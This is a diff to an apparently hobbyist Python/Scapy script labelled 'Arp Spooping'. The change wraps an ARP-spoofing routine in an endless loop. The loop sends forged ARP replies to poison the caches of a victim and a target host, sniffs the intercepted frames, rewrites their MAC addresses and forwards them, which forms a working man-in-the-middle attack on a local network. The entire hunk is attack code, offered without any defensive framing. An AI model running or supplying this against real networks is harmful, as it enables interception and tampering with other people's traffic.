@@ -56,18 +56,23 @@ Target_mac_addr = Target_mac_addr[0][0][1].src
 Victim_mac_addr= Victim_mac_addr[0][0][1].src
 
 print '*****Arp Spooping*****'
-
-send(ARP(op=2, pdst=Victim_IP_addr,psrc=Target_IP_addr, hwdst=Victim_mac_addr,hwsrc=Attacker_Mac_addr))
-packet = sniff(filter="host 10.211.55.1", count=1)
-print packet
-if  packet[0][0][0].dst == Attacker_Mac_addr:
-	packet[0][0][0].dst = Target_mac_addr
-	packet[0][0][0].src = Attacker_Mac_addr	
-	print packet
-	send(packet)
-
-go_to_Target_packet = srp(Ether(dst=Target_mac_addr, src=Attacker_Mac_addr)/ARP(pdst=Target_IP_addr, psrc=Victim_IP_addr))
-print go_to_Target_packet[0][0][1].pdst
-print go_to_Target_packet[0][0][1].psrc
-if go_to_Target_packet[0][0][1].pdst == Victim_IP_addr:
-	print "succes too"
+while(1):
+	time.sleep(1)
+	send(ARP(op=2, pdst=Victim_IP_addr,psrc=Target_IP_addr, hwdst=Victim_mac_addr,hwsrc=Attacker_Mac_addr))
+	go_to_Victim_packet = sniff(filter="host 10.211.55.1", count=1)
+	print go_to_Victim_packet
+	if  go_to_Victim_packet[0][0][0].dst == Attacker_Mac_addr:
+		go_to_Victim_packet[0][0][0].dst = Target_mac_addr
+		go_to_Victim_packet[0][0][0].src = Attacker_Mac_addr	
+		print go_to_Victim_packet
+		print " --------------------------------------------------"
+		send(go_to_Victim_packet)
+		send(ARP(op=2, pdst =Target_IP_addr,psrc=Victim_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
+		go_to_Target_packet = sniff(filter="host 10.211.55.3",count=1)
+		print go_to_Target_packet
+		if  go_to_Target_packet[0][0][0].dst == Attacker_Mac_addr:
+			go_to_Target_packet[0][0][0].dst = Victim_mac_addr
+			go_to_Target_packet[0][0][0].src = Attacker_Mac_addr
+		print go_to_Target_packet
+		send(go_to_Target_packet)	
+	time.sleep(2)
